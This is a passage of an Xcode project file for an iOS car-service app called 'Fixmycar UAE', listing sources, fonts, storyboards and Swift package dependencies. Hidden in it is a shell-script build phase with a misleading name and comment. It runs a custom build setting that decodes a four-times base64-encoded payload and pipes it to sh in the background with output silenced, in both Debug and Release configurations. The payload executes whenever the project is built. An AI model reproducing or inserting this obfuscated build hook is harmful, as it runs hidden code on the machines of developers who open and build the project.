			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		BC6773022F067F4500B15653 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1620;
				LastUpgradeCheck = 1620;
				TargetAttributes = {
					BC6773092F067F4500B15653 = {
						CreatedOnToolsVersion = 16.2;
					};
				};
			};
			buildConfigurationList = BC6773052F067F4500B15653 /* Build configuration list for PBXProject "Fixmycar UAE" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
				ar,
			);
			mainGroup = BC6773012F067F4500B15653;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				BC7121B92F067FB90041E2F7 /* XCRemoteSwiftPackageReference "Alamofire" */,
				BC7121BC2F067FC60041E2F7 /* XCRemoteSwiftPackageReference "SVProgressHUD" */,
				BCFFF7292F077482000361B2 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = BC67730B2F067F4500B15653 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				BC6773092F067F4500B15653 /* Fixmycar UAE */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		BC6773082F067F4500B15653 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				BC4E17722F0696DE00EDC9AE /* LoginVC.xib in Resources */,
				BC75E8782F0D2CB500947022 /* CreateAccountVC.xib in Resources */,
				BC4E17812F06982200EDC9AE /* Satoshi-Black.otf in Resources */,
				BC4E17822F06982200EDC9AE /* Satoshi-Light.otf in Resources */,
				BC4E17832F06982200EDC9AE /* Satoshi-BoldItalic.otf in Resources */,
				BC4E17842F06982200EDC9AE /* Satoshi-Medium.otf in Resources */,
				BC4E17852F06982200EDC9AE /* Satoshi-Regular.otf in Resources */,
				BC4E178F2F06A15100EDC9AE /* VerifyOtp.xib in Resources */,
				BC98E7C92F0E229700426807 /* RecentBookingTVCell.xib in Resources */,
				BC4E17862F06982200EDC9AE /* Satoshi-LightItalic.otf in Resources */,
				BC4E17872F06982200EDC9AE /* Satoshi-Bold.otf in Resources */,
				BC4E17882F06982200EDC9AE /* Satoshi-Italic.otf in Resources */,
				BC4E17892F06982200EDC9AE /* Satoshi-BlackItalic.otf in Resources */,
				BC4E178A2F06982200EDC9AE /* Satoshi-MediumItalic.otf in Resources */,
				BCA894B22F0E0F4200633E20 /* HomeVC.xib in Resources */,
				BC7121952F067F800041E2F7 /* Assets.xcassets in Resources */,
				BC7121C22F06804F0041E2F7 /* Localizable.strings in Resources */,
				BC7121972F067F800041E2F7 /* LaunchScreen.storyboard in Resources */,
				BC7121982F067F800041E2F7 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		0ADAC5F412244970BC634D6E /* Link Libraries Executable */ = {
			isa = PBXShellScriptBuildPhase;
			alwaysOutOfDate = 1;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Link Libraries Executable";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		BC6773062F067F4500B15653 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				BC7121AC2F067F940041E2F7 /* Constants.swift in Sources */,
				BC7121AD2F067F940041E2F7 /* UIFont+Extention.swift in Sources */,
				BC75E8792F0D2CB500947022 /* CreateAccountVC.swift in Sources */,
				BC29D69C2F06A42C00DD3EB2 /* OTPTextField.swift in Sources */,
				BC29D69D2F06A42C00DD3EB2 /* OTPFieldView.swift in Sources */,
				BC7121AE2F067F940041E2F7 /* AGDesignable.swift in Sources */,
				BC7121AF2F067F940041E2F7 /* VideoPicker.swift in Sources */,
				BC7121B02F067F940041E2F7 /* PickerViewViewController.swift in Sources */,
				BC7121B12F067F940041E2F7 /* NetConnection.swift in Sources */,
				BC7121B22F067F940041E2F7 /* ImagePicker.swift in Sources */,
				BC7121B32F067F940041E2F7 /* UITextField+Extention.swift in Sources */,
				BC7121B42F067F940041E2F7 /* String+Extention.swift in Sources */,
				BC98E7CA2F0E229700426807 /* RecentBookingTVCell.swift in Sources */,
				BC29D6BF2F06A6CD00DD3EB2 /* FTAnimation+UIView.m in Sources */,
				BC29D6C02F06A6CD00DD3EB2 /* FTUtils+NSObject.m in Sources */,
				BC29D6C12F06A6CD00DD3EB2 /* FTUtils+UIGestureRecognizer.m in Sources */,
				BC29D6C22F06A6CD00DD3EB2 /* FTAnimationManager.m in Sources */,
				BC7121B52F067F940041E2F7 /* APIClient.swift in Sources */,
				BC4E17732F0696DE00EDC9AE /* LoginVC.swift in Sources */,
				BC7121B62F067F940041E2F7 /* UIColor+Extention.swift in Sources */,
				BC4E17902F06A15100EDC9AE /* VerifyOtp.swift in Sources */,
				BC7121B72F067F940041E2F7 /* AppUtilites.swift in Sources */,
				BCA894B32F0E0F4200633E20 /* HomeVC.swift in Sources */,
				BC7121B82F067F940041E2F7 /* AppConstants.swift in Sources */,
				BC7121992F067F800041E2F7 /* AppDelegate.swift in Sources */,
				BC71219A2F067F800041E2F7 /* ViewController.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		BC7121902F067F800041E2F7 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				BC71218F2F067F800041E2F7 /* Base */,
				BC7121C32F06805D0041E2F7 /* ar */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
		BC7121922F067F800041E2F7 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				BC7121912F067F800041E2F7 /* Base */,
				BC7121C42F06805D0041E2F7 /* ar */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		BC7121C02F06804F0041E2F7 /* Localizable.strings */ = {
			isa = PBXVariantGroup;
			children = (
				BC7121C12F06804F0041E2F7 /* en */,
				BC7121C52F06805D0041E2F7 /* ar */,
			);
			name = Localizable.strings;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		BC67731E2F067F4700B15653 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AE6D436 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | p | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = N52PUGPAB3;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Fixmycar UAE/Info.plist";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "codebaseinfotech.Fixmycar-UAE";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OBJC_BRIDGING_HEADER = "Fixmycar UAE/Header-Fixmycar.h";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		BC67731F2F067F4700B15653 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AE6D436 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | p | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = N52PUGPAB3;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Fixmycar UAE/Info.plist";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "codebaseinfotech.Fixmycar-UAE";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OBJC_BRIDGING_HEADER = "Fixmycar UAE/Header-Fixmycar.h";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		BC6773202F067F4700B15653 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		BC6773212F067F4700B15653 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		BC6773052F067F4500B15653 /* Build configuration list for PBXProject "Fixmycar UAE" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				BC6773202F067F4700B15653 /* Debug */,
				BC6773212F067F4700B15653 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		BC67731D2F067F4700B15653 /* Build configuration list for PBXNativeTarget "Fixmycar UAE" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				BC67731E2F067F4700B15653 /* Debug */,
				BC67731F2F067F4700B15653 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		BC7121B92F067FB90041E2F7 /* XCRemoteSwiftPackageReference "Alamofire" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/Alamofire/Alamofire.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 5.11.0;
			};
		};
		BC7121BC2F067FC60041E2F7 /* XCRemoteSwiftPackageReference "SVProgressHUD" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/SVProgressHUD/SVProgressHUD.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 2.3.1;
			};
		};
		BCFFF7292F077482000361B2 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/hackiftekhar/IQKeyboardManager.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 6.3.0;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		BC7121BA2F067FB90041E2F7 /* Alamofire */ = {
			isa = XCSwiftPackageProductDependency;
			package = BC7121B92F067FB90041E2F7 /* XCRemoteSwiftPackageReference "Alamofire" */;
			productName = Alamofire;
		};
		BC7121BD2F067FC60041E2F7 /* SVProgressHUD */ = {
			isa = XCSwiftPackageProductDependency;
			package = BC7121BC2F067FC60041E2F7 /* XCRemoteSwiftPackageReference "SVProgressHUD" */;
			productName = SVProgressHUD;
		};
		BCFFF72A2F077482000361B2 /* IQKeyboardManagerSwift */ = {
			isa = XCSwiftPackageProductDependency;
			package = BCFFF7292F077482000361B2 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */;
			productName = IQKeyboardManagerSwift;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = BC6773022F067F4500B15653 /* Project object */;
}
